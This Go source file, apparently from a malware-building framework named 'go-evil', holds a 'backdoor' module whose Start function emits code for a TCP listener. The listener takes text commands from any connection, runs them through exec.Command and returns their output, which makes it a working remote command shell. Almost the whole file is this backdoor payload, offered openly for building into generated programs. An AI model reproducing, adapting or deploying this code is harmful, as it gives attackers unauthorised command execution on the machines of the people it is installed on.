package backdoor

import (
	"fmt"

	"github.com/s9rA16Bf4/go-evil/utility/structure/functions"
	"github.com/s9rA16Bf4/go-evil/utility/structure/json"
)

// Enables the backdoor, the input is the port to use
func Start(value string, data_object *json.Json_t) []string {
	function_call := "start"

	data_object.Add_go_function(functions.Go_func_t{Name: function_call, Func_type: "", Part_of_struct: "", Return_type: "",
		Parameters: []string{"repr_1 []int"},
		Gut: []string{
			"port := spine.variable.get(spine.alpha.construct_string(repr_1))",
			"server, err := net.Listen(\"tcp\", fmt.Sprintf(\"127.0.0.1:%s\", port))",

			"if err != nil {",
			"spine.log(err.Error())",
			"}",

			"defer server.Close()",
			"for {",

			"connection, err := server.Accept()",

			"if err != nil {",
			"spine.log(err.Error())",
			"}",

			"go func() {",
			"for {",

			"connection.Write([]byte(\">> \"))",
			"read_data := make([]byte, 1024)",
			"connection.Read(read_data)",

			"if read_data[0] == 0 {",
			"continue",
			"}",

			"command := \"\"",
			"args := \"\"",
			"first_space := false",

			"for _, c := range read_data {",
			"if c == 0 || c == 10 { break }",

			"if c == 32 && !first_space {",
			"first_space = true",
			"} else {",

			"if !first_space {",
			"command += string(c)",
			"} else {",
			"args += string(c)",
			"}",

			"}",

			"toReturn := []byte{}",
			"if command == \"\" {",
			"toReturn = append(toReturn, []byte(\"No command was entered\")...)",
			"} else {",

			"if args != \"\"{",
			"toReturn, err = exec.Command(command, args).Output()",
			"} else {",
			"toReturn, err = exec.Command(command).Output()",
			"}",

			"}",
			"connection.Write([]byte(toReturn))",

			"}",

			"}",

			"}()",

			"}",
		}})

	data_object.Add_go_import("fmt")
	data_object.Add_go_import("net")
	data_object.Add_go_import("os/exec")

	parameter_1 := data_object.Generate_int_array_parameter(value)

	return []string{fmt.Sprintf("%s(%s)", function_call, parameter_1)}
}
